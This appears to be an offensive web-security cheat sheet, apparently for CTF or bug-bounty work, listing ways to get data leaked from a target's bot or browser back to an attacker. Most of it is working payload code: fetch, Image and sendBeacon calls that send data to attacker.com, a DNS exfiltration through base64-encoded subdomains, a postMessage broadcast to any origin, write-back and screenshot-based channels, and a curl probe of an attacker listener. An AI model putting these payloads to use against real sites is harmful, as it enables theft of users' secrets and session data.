# Readback oracles — how the leaked data reaches you

Every exfil channel — a listener, a write-back, a server-state read.

---

## 1. The listener — the classic exfil

```js
// a GET to your listener — the data rides the URL
fetch('https://attacker.com/?'+encodeURIComponent(d))
new Image().src='https://attacker.com/?'+encodeURIComponent(d)
navigator.sendBeacon('https://attacker.com/',d)
```

```text
the classic exfil — a GET to your server — the data rides the URL
path or the body. requires: the bot can reach your listener.
```

## 2. The write-back — an airgapped exfil

```js
// a POST to the target storing the leaked data — a comment, a field
fetch('https://t/api/comment',{
  method:'POST',
  body:JSON.stringify({text:leaked})
})
```

```text
an airgapped bot can't reach your listener — a write-back lands the
data on the TARGET — you read it back later via a GET.
```

## 3. The DOM-writeback — a screenshotting bot

```js
// the secret rendered visibly — the screenshot IS the exfil
document.body.innerHTML=
  '<div style="position:fixed;inset:0;background:#fff;font-size:80px;color:#000">'
  +leaked+'</div>'
```

```text
a bot that screenshots the page — the rendered secret IS the read-back
— no listener, no server-state read needed.
```

## 4. The server-state read — a counter/recency/token

```text
an airgapped case — a server-state channel you read on the target:
- a counter — a GET /counter — the current value
- a rate-limit — a header — 'X-RateLimit-Remaining'
- a 'last seen' — a GET /last-seen — the timestamp
- a session-mutation — a GET /session — the stored value
- an LRU-eviction — a SCAN of the store — the surviving keys
```

## 5. The DNS exfil — a subdomain carrier

```js
// the data rides the DNS subdomain — an airgapped case
new Image().src='https://'+btoa(d)+'.attacker.com/'
```

```text
a DNS lookup carries the data in the subdomain — an airgapped case
where the bot can resolve DNS but not reach your listener directly.
```

## 6. The postMessage — a broadcast carrier

```js
// the data broadcast to any listener — a real read primitive
parent.postMessage(leaked,'*')
```

```text
a postMessage broadcast — the data transmitted to '*' — a real read
primitive (a broadcast, not a measure) — requires a listener in a
parent/opener context.
```

## 7. The meta-refresh — a same-site navigation carrier

```text
a meta-refresh issued BY THE TARGET is a same-site navigation — it
carries the Lax cookie — the sealed shape's privileged request is a
same-site navigation — the read-back is a server-state channel or
a write-back.
```

## 8. The per-channel reach — which exfil for which case

```text
a bot that reaches your listener   → a listener — the classic exfil
an airgapped bot                   → a write-back / a server-state read /
                                     a DOM-writeback / a DNS exfil
a screenshotting bot               → a DOM-writeback — the screenshot
a same-site navigation             → a server-state read / a write-back
a postMessage-listener context     → a postMessage broadcast
a DNS-resolvable bot               → a DNS exfil
```

## 9. The exfil's data-format — how the data rides

```text
a URL path      → '/leak/ab' — the match in the path
a query param   → '?d=<data>' — the match in the query
a body          → a POST body — the match in the body
a subdomain     → '<b64>.a.com' — the match in the subdomain
a comment/field → a stored value — the match in a field
a rendered DOM  → a screenshot — the match in the render
```

## 10. The exfil's feasibility — the channel's reach

```text
a listener — the bot's network reach
a write-back — a POST endpoint that stores
a DOM-writeback — a screenshotting bot
a server-state read — a readable mutation surface
a DNS exfil — a DNS-resolvable subdomain
a postMessage — a parent/opener listener
```

## 11. The exfil's blast-radius — the write's scope

```text
a write-back — a stored comment — a small write
a DOM-writeback — a DOM mutation — non-destructive
a listener — a read — non-destructive
a server-state read — a read — non-destructive
```

## 12. The exfil-check — does the data reach you

```bash
# can the bot reach your listener
curl -sI "https://attacker.com/listener" || echo "airgapped — a server-state channel"
# a write-back surface — a comment/note endpoint
grep -rnoiE 'comment|note|post|store|submit' <src> | head -10
# a server-state surface — a counter/recency/token
grep -rnoiE 'counter|incr|last.?seen|GETDEL|session' <src> | head -10
```
